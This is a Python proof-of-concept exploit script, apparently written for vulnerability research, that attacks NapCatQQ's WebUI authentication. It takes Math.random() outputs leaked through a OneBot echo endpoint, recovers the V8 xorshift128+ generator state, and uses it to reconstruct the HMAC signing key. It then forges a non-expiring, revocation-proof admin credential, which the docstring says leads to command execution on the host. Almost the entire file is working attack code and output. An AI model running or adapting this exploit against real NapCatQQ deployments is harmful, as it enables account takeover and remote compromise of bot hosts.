#!/usr/bin/env python3
"""
NapLotto attack — recover NapCatQQ's WebUI credential HMAC key from the OneBot
`echo` oracle and forge a permanent admin credential.

Steps (all against the real code running in `server.js`):
1. Sniff ONE victim credential (HashEncoded + Hmac). Its CreatedTime is 2 hours
   old, so the unmodified credential is expired (and revoked) — but its Hmac is
   a known HMAC-SHA256(key, known_json), i.e. the verification oracle.
2. Collect 5 echo values from the OneBot-style `/echo` endpoint. Each is
   `Math.random().toString(36).substring(2, 15)` — an exact V8 Math.random()
   double encoded as base36 (the string is the double's shortest round-trip
   representation; base36 doubles need <= 11 significant digits + up to 2
   leading zeros, so the 13-char window captures the full value for all but
   ~1/46656 of draws — if the z3 solve is unsat we retry with fresh echoes).
3. Recover the V8 xorshift128+ state with z3 (drawing_board/
   v8_math_random_predictor.py) from the 5 consecutive outputs.
4. Roll the state to the process-startup key draw:
   `secretKey = Math.random().toString(36).slice(2)` (SignToken.ts:5) was the
   FIRST Math.random() call in the process; the echoes follow it on the same
   64-value cache. Scan the rolled-forward stream for the draw position (its
   offset is determined by the cache mechanics; verified against the demo /key).
5. The recovered double must be converted back to the EXACT key string V8's
   Number.prototype.toString(36) produced (the HMAC key is the string). V8's
   radix-36 emitter is floor-based, so instead of guessing its last digit we
   enumerate every k-digit string in the round-trip interval of the double
   (a small set) and test each against the sniffed HMAC — exactly what a real
   attacker would do. The candidate that reproduces the sniffed Hmac IS the key.
6. Forge a credential: the sniffed HashEncoded re-signed with CreatedTime = now
   and the recovered key. The REAL validateCredentialWithinOneHour() accepts it
   — an expired/revoked session is resurrected into a permanent one (the 1-hour
   expiry and the revocation list are both HMAC-keyed and can no longer
   constrain the attacker). With admin WebUI access, NapCatQQ's Debug/File/
   Plugin/Process APIs give command execution on the bot host.
"""

import hashlib
import hmac as hmacmod
import json
import sys
import time
import urllib.error
import urllib.request

HERE = "/home/millie/tools/aivr"
sys.path.insert(0, HERE + "/drawing_board")
from v8_math_random_predictor import recover_state_before, to_mant  # noqa: E402

BASE = "http://127.0.0.1:19277"
MASK = (1 << 64) - 1
DIGITS = "0123456789abcdefghijklmnopqrstuvwxyz"


def get(path):
    return urllib.request.urlopen(BASE + path, timeout=10).read()


def post(path, payload):
    req = urllib.request.Request(BASE + path, data=json.dumps(payload).encode(),
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        return urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError as e:
        return e  # 401 is the expected rejection; caller reads .read()


def b36_to_double(s):
    """Exact double whose shortest base36 fraction is `s` (the chars after
    '0.'). Exact rational arithmetic with round-half-even (matches JS parse)."""
    k = len(s)
    num = int(s, 36) * (1 << 52)
    q, r = divmod(num, 36 ** k)
    if 2 * r > 36 ** k or (2 * r == 36 ** k and q % 2 == 1):
        q += 1
    return q / float(1 << 52)


def collect_echoes(n):
    out = []
    for _ in range(n):
        e = json.loads(get("/echo"))["echo"]
        out.append((e, b36_to_double(e)))
    return out


def fwd(a, b):
    na = b
    t = a ^ ((a << 23) & MASK)
    t ^= t >> 17
    t ^= b
    t ^= b >> 26
    return na, t & MASK


def candidate_key_strings(d):
    """The candidate digit strings at the SHORTEST length k for which some
    k-digit string parses to d — i.e. exactly the strings V8's shortest-repr
    emitter could have produced. The interval of such strings per k has width
    ~36^k/2^52, so at the shortest k it is tiny (1..~30 strings)."""
    M = to_mant(d)
    for k in range(1, 13):
        out = []
        lo = (M * 36 ** k - (36 ** k) // 2 + (1 << 52) - 1) // (1 << 52)
        hi = (M * 36 ** k + (36 ** k) // 2) // (1 << 52)
        for c in range(max(0, lo - 1), hi + 2):
            q2, r2 = divmod(c * (1 << 52), 36 ** k)
            if 2 * r2 > 36 ** k or (2 * r2 == 36 ** k and q2 % 2 == 1):
                q2 += 1
            if q2 != M or c == 0:
                continue
            s = ""
            x = c
            for _ in range(k):
                s = DIGITS[x % 36] + s
                x //= 36
            if x == 0:
                out.append(s)
        if out:
            return out
    return []


def main():
    print("=" * 78)
    print("NapLotto — NapCatQQ WebUI credential key recovery via OneBot echo oracle")
    print("=" * 78)

    # 1. Sniff one victim credential (expired/revoked session, issued 2h ago)
    sniffed = json.loads(post("/victim", {}).read())
    sniffed_json = json.dumps(sniffed["Data"], separators=(",", ":"))
    print("\n[1] Sniffed victim credential (issued 2h ago -> expired):")
    print(f"    HashEncoded = {sniffed['Data']['HashEncoded'][:32]}...")
    print(f"    CreatedTime = {sniffed['Data']['CreatedTime']}")
    print(f"    Hmac        = {sniffed['Hmac'][:32]}...")

    r = post("/check", sniffed)
    print(f"    real validation of unmodified sniffed credential: "
          f"{r.status} ({json.loads(r.read())['accepted']})")

    # 2-3. Collect exact Math.random() doubles from the echo oracle and recover
    # the xorshift128+ state (retry with fresh echoes if a rare truncated draw
    # makes the solve unsatisfiable)
    S0 = S1 = None
    for attempt in range(3):
        echoes = collect_echoes(5)
        observed = [d for _, d in echoes]        # consumption order
        try:
            S0, S1 = recover_state_before(observed[::-1])
            break
        except AssertionError:
            print(f"    (solve unsat — retrying with fresh echoes, attempt {attempt + 1})")
    assert S0 is not None
    print(f"\n[2] Collected 5 echo values (exact V8 doubles):")
    for e, d in echoes:
        print(f"    {e[:14]:14s} -> {d:.17g}")
    print(f"\n[3] Recovered xorshift128+ state: S0={S0:016x} S1={S1:016x}")

    # 4-5. Roll forward from the recovered state to the key draw (the FIRST
    # Math.random() call of the process; the echoes are the next calls on the
    # same 64-value cache), and identify the exact key STRING. V8's radix-36
    # emitter is floor-based, so instead of emulating its last digit we
    # enumerate the shortest-length candidate strings of each rolled position
    # and test them against the sniffed HMAC — exactly what a real attacker
    # would do (no /key needed; /key below is only the demo cross-check).
    a, b = S0, S1
    key_str = None
    found_k = None
    for k in range(0, 10):
        cand_d = (a >> 12) / float(1 << 52)
        for c in candidate_key_strings(cand_d):
            test = hmacmod.new(c.encode(), sniffed_json.encode(), hashlib.sha256).hexdigest()
            if test == sniffed["Hmac"]:
                key_str, found_k = c, k
                break
        if key_str:
            break
        a, b = fwd(a, b)
    assert key_str is not None, "no rolled position reproduces the sniffed HMAC"
    real_key = get("/key").decode()
    print(f"\n[4] Key draw found {found_k} forward steps from the recovered base state")
    print(f"    (V8 64-cache slot arithmetic; position identified by the HMAC oracle).")
    print(f"\n[5] HMAC oracle selected : {key_str!r}")
    print(f"    real key (demo /key) : {real_key!r}")
    print(f"    MATCH: {key_str == real_key}")

    # 6. Forge a permanent credential: sniffed HashEncoded + CreatedTime = now
    forged_inner = {"CreatedTime": int(time.time()),
                    "HashEncoded": sniffed["Data"]["HashEncoded"]}
    forged = {
        "Data": forged_inner,
        "Hmac": hmacmod.new(key_str.encode(),
                            json.dumps(forged_inner, separators=(",", ":")).encode(),
                            hashlib.sha256).hexdigest(),
    }
    r = post("/check", forged)
    accepted = json.loads(r.read())["accepted"]
    print(f"\n[6] Real validateCredentialWithinOneHour() on forged credential: "
          f"{r.status} accepted={accepted}")

    print("\n" + "=" * 78)
    if key_str == real_key and accepted:
        print("RESULT: VULNERABLE — the OneBot echo oracle exposes the exact V8")
        print("Math.random() stream; 5 echoes recover the xorshift128+ state and")
        print("the WebUI credential HMAC key, resurrecting an expired admin")
        print("credential into a permanent, revocation-proof session (admin RCE")
        print("surface: Debug/File/Plugin/Process APIs of the WebUI).")
        return 0
    print("RESULT: demonstration incomplete")
    return 1


if __name__ == "__main__":
    sys.exit(main())
